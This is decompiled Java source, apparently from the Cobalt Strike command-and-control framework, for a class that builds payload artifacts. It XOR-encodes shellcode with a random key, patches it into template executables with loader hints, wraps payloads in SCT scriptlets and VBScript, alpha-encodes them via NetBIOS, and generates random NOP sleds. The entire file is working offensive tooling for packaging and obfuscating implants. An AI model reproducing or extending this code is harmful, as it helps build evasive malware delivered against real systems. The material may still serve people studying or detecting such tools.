package common;

import aggressor.AggressorClient;
import aggressor.TeamServerProps;
import encoders.NetBIOS;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Stack;
import pe.BeaconLoader;
import pe.PEEditor;
import sleep.runtime.SleepUtils;

public class BaseArtifactUtils {
   protected AggressorClient client;

   public BaseArtifactUtils(AggressorClient var1) {
      this.client = var1;
   }

   public byte[] fixChecksum(byte[] var1) {
      if (License.isTrial()) {
         return var1;
      } else {
         try {
            PEEditor var2 = new PEEditor(var1);
            if ("true".equalsIgnoreCase(TeamServerProps.getPropsFile().getString("logging.PEEditor_BaseArtifactUtils", "false"))) {
               var2.setLogActions(true);
            }

            var2.updateChecksum();
            return var2.getImage();
         } catch (Throwable var3) {
            MudgeSanity.logException("fixChecksum() failed for " + var1.length + " byte file. Skipping the checksum update", var3, false);
            return var1;
         }
      }
   }

   public byte[] patchArtifact(byte[] var1, String var2) {
      Stack var3 = new Stack();
      var3.push(SleepUtils.getScalar(var1));
      var3.push(SleepUtils.getScalar(var2));
      String var4 = this.client.getScriptEngine().format("EXECUTABLE_ARTIFACT_GENERATOR", var3);
      return var4 == null ? this.fixChecksum(this._patchArtifact(var1, var2)) : this.fixChecksum(CommonUtils.toBytes(var4));
   }

   public byte[] _patchArtifact(byte[] var1, String var2) {
      try {
         String var3 = var2.startsWith("artifact32") ? "x86" : "x64";
         InputStream var4 = CommonUtils.resource("resources/" + var2);
         byte[] var5 = CommonUtils.readAll(var4);
         var4.close();
         byte[] var6 = new byte[]{(byte)CommonUtils.rand(254), (byte)CommonUtils.rand(254), (byte)CommonUtils.rand(254), (byte)CommonUtils.rand(254)};
         byte[] var7 = new byte[var1.length];

         for(int var8 = 0; var8 < var1.length; ++var8) {
            var7[var8] = (byte)(var1[var8] ^ var6[var8 % 4]);
         }

         String var13 = CommonUtils.bString(var5);
         int var9 = var13.indexOf(CommonUtils.repeat("A", 1024));
         Packer var10 = new Packer();
         var10.little();
         var10.addInteger(var9 + 16);
         var10.addInteger(var1.length);
         var10.addString(var6, var6.length);
         if (BeaconLoader.hasLoaderHint(this.client, var1, var3)) {
            var10.addInteger(BeaconLoader.getLoaderHint(var1, var3, "GetModuleHandleA"));
            var10.addInteger(BeaconLoader.getLoaderHint(var1, var3, "GetProcAddress"));
         } else {
            var10.addInteger(0);
            var10.addInteger(0);
         }

         var10.addString(var7, var7.length);
         if (License.isTrial()) {
            var10.addString("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
            CommonUtils.print_trial("Added EICAR string to " + var2);
         }

         byte[] var11 = var10.getBytes();
         var13 = CommonUtils.replaceAt(var13, CommonUtils.bString(var11), var9);
         return CommonUtils.toBytes(var13);
      } catch (IOException var12) {
         MudgeSanity.logException("patchArtifact", var12, false);
         return new byte[0];
      }
   }

   public void patchArtifact(byte[] var1, String var2, String var3) {
      byte[] var4 = this.patchArtifact(var1, var2);
      CommonUtils.writeToFile(new File(var3), var4);
   }

   public static String escape(byte[] var0) {
      StringBuffer var1 = new StringBuffer(var0.length * 10);

      for(int var2 = 0; var2 < var0.length; ++var2) {
         var1.append("\\u");
         var1.append(CommonUtils.toUnicodeEscape(var0[var2]));
      }

      return var1.toString();
   }

   public byte[] buildSCT(byte[] var1) {
      String var2 = CommonUtils.bString(CommonUtils.readResource("resources/template.sct")).trim();
      var2 = CommonUtils.strrep(var2, "$$PROGID$$", CommonUtils.garbage("progid"));
      var2 = CommonUtils.strrep(var2, "$$CLASSID$$", CommonUtils.ID());
      var2 = CommonUtils.strrep(var2, "$$CODE$$", CommonUtils.bString((new MutantResourceUtils(this.client)).buildVBS(var1)));
      return CommonUtils.toBytes(var2);
   }

   public static boolean isLetter(byte var0) {
      char var1 = (char)var0;
      return var1 == '_' || var1 == ' ' || var1 >= 'A' && var1 <= 'Z' || var1 >= 'a' && var1 <= 'z' || var1 == '0' || var1 >= '1' && var1 <= '9';
   }

   public static String toVBS(byte[] var0) {
      return toVBS(var0, 8);
   }

   public static List toChunk(String var0, int var1) {
      LinkedList var2 = new LinkedList();
      StringBuffer var3 = new StringBuffer();

      for(int var4 = 0; var4 < var0.length(); ++var4) {
         var3.append(var0.charAt(var4));
         if (var3.length() >= var1) {
            var2.add(var3.toString());
            var3 = new StringBuffer();
         }
      }

      if (var3.length() > 0) {
         var2.add(var3.toString());
      }

      return var2;
   }

   public static String toVBS(byte[] var0, int var1) {
      LinkedList var2 = new LinkedList();

      for(int var3 = 0; var3 < var0.length; ++var3) {
         if (!isLetter(var0[var3])) {
            var2.add("Chr(" + var0[var3] + ")");
         } else {
            StringBuffer var4 = new StringBuffer();
            var4.append("\"");
            var4.append((char)var0[var3]);

            while(var3 + 1 < var0.length && isLetter(var0[var3 + 1]) && var4.length() <= var1) {
               var4.append((char)var0[var3 + 1]);
               ++var3;
            }

            var4.append("\"");
            var2.add(var4.toString());
         }
      }

      StringBuffer var8 = new StringBuffer(var0.length * 10);
      Iterator var9 = var2.iterator();
      int var5 = 0;

      for(int var6 = 0; var9.hasNext(); ++var6) {
         String var7 = (String)var9.next();
         var8.append(var7);
         var5 += var7.toString().length() + 1;
         if (var5 > 200 && var9.hasNext()) {
            var8.append("& _\n");
            var5 = 0;
            var6 = 0;
         } else if (var6 >= 32 && var9.hasNext()) {
            var8.append("& _\n");
            var5 = 0;
            var6 = 0;
         } else if (var9.hasNext()) {
            var8.append("&");
         }
      }

      return var8.toString();
   }

   public static String toHex(byte[] var0) {
      StringBuffer var1 = new StringBuffer(var0.length * 3);

      for(int var2 = 0; var2 < var0.length; ++var2) {
         int var3 = (var0[var2] & 240) >> 4;
         int var4 = var0[var2] & 15;
         var1.append(Integer.toHexString(var3));
         var1.append(Integer.toHexString(var4));
      }

      return var1.toString();
   }

   public static String AlphaEncode(byte[] var0) {
      AssertUtils.Test(var0.length > 16384, "AlphaEncode used on a stager (or some other small thing)");
      return _AlphaEncode(var0);
   }

   public static String _AlphaEncode(byte[] var0) {
      String var1 = CommonUtils.bString(CommonUtils.readResource("resources/netbios.bin"));
      var1 = var1 + "gogo";
      var1 = var1 + NetBIOS.encode('A', var0);
      var1 = var1 + "aa";
      return var1;
   }

   public static byte[] randomNOP() {
      LinkedList var0 = new LinkedList();
      var0.add(new byte[]{-112});
      var0.add(new byte[]{-121, -37});
      var0.add(new byte[]{-121, -55});
      var0.add(new byte[]{-121, -46});
      var0.add(new byte[]{-121, -1});
      var0.add(new byte[]{-121, -10});
      var0.add(new byte[]{102, -112});
      var0.add(new byte[]{102, -121, -37});
      var0.add(new byte[]{102, -121, -55});
      var0.add(new byte[]{102, -121, -46});
      var0.add(new byte[]{102, -121, -1});
      var0.add(new byte[]{102, -121, -10});
      return (byte[])((byte[])CommonUtils.pick((List)var0));
   }
}
